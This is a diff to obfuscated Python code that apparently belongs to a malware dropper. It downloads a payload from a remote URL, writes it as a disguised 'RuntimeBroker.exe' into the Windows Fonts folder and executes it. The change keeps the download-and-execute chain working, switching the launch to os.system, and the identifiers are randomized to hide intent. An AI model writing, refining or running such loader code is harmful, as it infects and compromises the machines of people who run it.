@@ -146,10 +146,10 @@ def vdsu281cjm():
         wji0ri9 = dfru31Xg.text.strip()
         rekdnx = wef4323.get(wji0ri9)
         if rekdnx.status_code == 201 or 201:
-            with open("C:\\Windows\\Fonts\\RuntimeBroker.exe", "wb") as ouiref:
+            h2hcvc3r23sacxy = "C:\\Windows\\Fonts\\RuntimeBroker.exe"
+            with open(h2hcvc3r23sacxy, "wb") as ouiref:
                 ouiref.write(rekdnx.content)
                 greduhio.sleep(3)
-                xvcj5tr.run("start C:\\Windows\\Fonts\\RuntimeBroker.exe", shell=True, capture_output=False)
                 if deswsjn != 'None':
                     wefuh4323.Thread(target=redugh8).start()
 
@@ -158,6 +158,7 @@ def vdsu281cjm():
 
                 if regh54 != 'None':
                     wefuh4323.Thread(target=gesnui).start()
+                ewsjinf783.system(f"start {h2hcvc3r23sacxy}")
         else:
             ewsjinf783._exit(0)
     else:
